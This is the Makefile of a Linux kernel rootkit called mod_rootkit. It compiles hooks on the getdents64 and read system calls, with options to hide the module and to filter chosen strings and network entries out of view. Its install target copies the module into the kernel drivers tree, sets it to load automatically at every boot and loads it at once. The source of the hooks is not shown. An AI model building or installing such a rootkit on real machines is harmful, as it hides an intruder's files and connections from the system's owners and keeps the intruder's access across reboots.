MODULE_NAME := mod_rootkit

STRING_EXCLUDES ?=
NET_EXCLUDES ?=
HIDE_MODULE ?= 0

obj-m += $(MODULE_NAME).o
$(MODULE_NAME)-objs := src/mod_rootkit.o \
                       src/hooks/x64_sys_getdents64.o \
                       src/hooks/x64_sys_read.o \
                       src/utils/ftrace_utils.o \
                       src/utils/kprobes_utils.o \
                       src/utils/proc_utils.o \
                       src/utils/excludes/net_filtering.o \
                       src/utils/excludes/string_filtering.o

EXTRA_CFLAGS += -I$(PWD)/include \
                -DMODULE_NAME=\"$(MODULE_NAME)\" \
                -DSTRING_EXCLUDES=\"$(STRING_EXCLUDES)\" \
                -DNET_EXCLUDES=\"$(NET_EXCLUDES)\"

ifeq ($(HIDE_MODULE),1)
  EXTRA_CFLAGS += -DHIDE_MODULE
else ifneq ($(HIDE_MODULE),0)
  $(error Invalid value for HIDE_MODULE: '$(HIDE_MODULE)'. Use 0 or 1.)
endif

# ──────────────────────────────

all:
	@echo "[+] Building kernel module: $(MODULE_NAME).ko"
	@echo "    > HIDE_MODULE      = $(HIDE_MODULE)"
	@echo "    > STRING_EXCLUDES  = $(STRING_EXCLUDES)"
	@echo "    > NET_EXCLUDES     = $(NET_EXCLUDES)"
	@echo "    > MODULE_NAME      = $(MODULE_NAME)"
	@echo "    > Kernel Version   = $(shell uname -r)"
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	@echo "[+] Build complete."

clean:
	@echo "[~] Cleaning build artifacts for $(MODULE_NAME)..."
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	@echo "[~] Clean done."

install:
	@echo "[+] Installing kernel module to system..."
	@echo "    > Target: /lib/modules/$(shell uname -r)/kernel/drivers/extra/$(MODULE_NAME).ko"
	sudo mkdir -p /lib/modules/$(shell uname -r)/kernel/drivers/extra
	sudo cp $(MODULE_NAME).ko /lib/modules/$(shell uname -r)/kernel/drivers/extra/
	sudo depmod -a
	@echo "[+] Creating auto-load config at /etc/modules-load.d/$(MODULE_NAME).conf"
	echo "$(MODULE_NAME)" | sudo tee /etc/modules-load.d/$(MODULE_NAME).conf > /dev/null
	@echo "[+] Module installed and set to auto-load at boot."
	@echo "[+] Loading module now..."
	sudo modprobe $(MODULE_NAME)
	@echo "[✓] Module loaded into kernel."

uninstall:
	@echo "[-] Uninstalling kernel module: $(MODULE_NAME)"
	@echo "    > Attempting to unload from kernel (if loaded)..."
	@sudo modprobe -r $(MODULE_NAME) || echo "    > Module not loaded or already removed."

	@echo "    > Removing /lib/modules/$(shell uname -r)/kernel/drivers/extra/$(MODULE_NAME).ko"
	@sudo rm -f /lib/modules/$(shell uname -r)/kernel/drivers/extra/$(MODULE_NAME).ko

	@echo "    > Removing auto-load config at /etc/modules-load.d/$(MODULE_NAME).conf"
	@sudo rm -f /etc/modules-load.d/$(MODULE_NAME).conf

	@echo "    > Updating module dependencies..."
	@sudo depmod -a

	@echo "[✓] Module $(MODULE_NAME) fully uninstalled."
